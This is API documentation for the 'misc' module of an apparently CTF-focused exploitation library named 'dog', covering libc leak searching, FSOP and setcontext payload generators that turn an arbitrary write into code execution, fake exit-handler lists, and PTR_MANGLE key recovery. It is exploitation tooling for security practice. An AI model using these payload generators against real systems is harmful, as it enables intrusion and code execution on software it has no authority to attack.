# misc

the `misc` modules contains stuff i couldn't fit anywhere else.



# API

### `#!python rerun(p: tube) -> Any`
`rerun` is function meant to make bruteforcing a little easier. it returns a function that, on call, will close the tube sent and attempt to accurately rerun your solve script.  
that means you can write something like this:
```python
from dog import *

p = process("./bin")
if args.RERUN:
    sys.excepthook = rerun(p)
```
now `python3 solve.py RERUN` will rerun your script everytime an uncaught exception is raised!  
**NOTE**: check out [dog brute](../CLI/brute.md) before using this

### `#!python find_libc_leak(memory_dump: bytes, addr: int, aligned: bool = False, bits: int = 64) -> int | None`
given a large dump of memory `memory_dump` that you know contains the address `addr` somewhere, search for that address by looking for anything that ends with the same last 12 bits (since those are not ASLR affected). `aligned` can be used to speed up the search if the memory dump is aligned, and `bits` sets whether you're searching a 32/64bit dump
```python
>>> libc = ELF("./libc.so.6")
>>> # say we have a process that starts off by dumping a bunch of memory out
>>> p = process("./dump_memory.bin")
>>> dump = p.recvn(0x3000)
>>> # we know there's a libc leak in here somewhere, but not sure exactly where
>>> printf = find_libc_leak(dump, libc.sym['printf'])
>>> libc.address = printf - libc.sym['printf']
```

### `#!python house_of_context(libc: ELF, file: str = "stdout", **kwargs: int) -> tuple[int, bytes]`
`house_of_context` attempts to achieve the same effects as [setcontext32](https://hackmd.io/@pepsipu/SyqPbk94a), turning a single arbitrary write into RCE with full register control, but works past libc 2.39 and requires writing about half as much data.
```python
>>> from dog import *
>>> libc = ELF("./libc.so.6",checksec=False)
>>> libc.address = 0x123895000
>>> where, what = house_of_context(libc, rip=0x696969, rdi=0x1, rsi=0x2)
>>> type(where) # this is where you should write to
<class 'int'>
>>> type(what) # this is what you should write at that address
<class 'bytes'>
```
it's very useful in situations like seccomp jails where you may need good register control.

as for how it works, we write an FSOP payload to stdout/stderr (depending on the situation).  
that FSOP payload is a polyglot of the [house of apple2](https://niftic.ca/posts/fsop/#_io_wdoallocbuf43) and [house of apple3](https://niftic.ca/posts/fsop/#__libio_codecvt_out147) attacks. the house of apple2 payload triggers the house of apple3 path, which we use because it has better RDI control.  
we then call `setcontext`, setting RDI to a fake ucontext_t we've written right after our file stream.  
of course, that means we end up corrupting something else in memory, but in my testing it should be OK:

*  right after stderr is stdout. corrupting this is not a problem, because if it is, you should be attacking stdout.
*  right after stdout are libc's internal pointers to stderr/stdin/stdout (used in the same way your own program does), which we fix by spraying &stdout to 'correct' them.

### `#!python setcontext32(libc: ELF, **kwargs: int) -> tuple[int, bytes]`
the original setcontext32 payload generator, as taken from [pepsipu's blog](https://hackmd.io/@pepsipu/SyqPbk94a)
```python
>>> from dog import *
>>> libc = ELF("./libc.so.6",checksec=False)
>>> libc.address = 0x123895000
>>> where, what = setcontext32(libc, rip=0x696969, rdi=0x1, rsi=0x2)
>>> type(where) # this is where you should write to
<class 'int'>
>>> type(what) # this is what you should write at that address
<class 'bytes'>
```

### `#!python setcontext(regs: dict[str, int], addr: int) -> bytes`
generate a fake `ucontext_t` that you want to write to `addr` and set the registers `regs`.
```python
>>> from dog import *
>>> blah = setcontext({'rsp':0x1234,'rip':0x11037,'rdi':0x42},0x10000)
>>> type(blah)
<class 'bytes'>
```

### `#!python fake_exit_function(funcs: list[tuple[int, int]], key: int) -> bytes`
create a fake `exit_function_list` for hijacking execution via the [exit handlers](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#6---code-execution-via-other-mangled-pointers-in-initial-structure)  
`funcs` should be a list of pairs of integers, the first being the function address and the second being the value of the first argument.  
`key` should be the value of the `PTR_MANGLE` key.
```python
>>> from dog import *
>>> libc = ELF("./libc.so.6")
>>> funcs = [ 
        (libc.sym['puts'], libc.binsh),  
        (libc.sym['gets'], libc.sym['_IO_2_1_stdout_']), 
        (libc.sym['exit'], 0) 
    ] # these will be called in order one-by-one
>>> out = fake_exit_function(funcs,key=0x6969)
>>> type(out)
<class 'bytes'>
```

### `#!python mangle(ptr: int, key: int) -> int`
perform `PTR_MANGLE` on `ptr` with key `key`.

### `#!python demangle(ptr: int, key: int) -> int`
perform `PTR_DEMANGLE` on the obfuscated pointer `ptr` with key `key`.

### `#!python mangle_kpt(enc: int, known: int) -> int`
reveal the `PTR_MANGLE` key through a known plaintext attack. if you have an encrypted pointer `enc`, and know it's obfuscating the value `known`, this will return the key used for mangling.

### `#!python proc_maps_parser(data: str) -> dict[str, int]`
given the output of `cat /proc/XXX/maps`, parse it into a dictionary that contains the base address of each mapping listed.
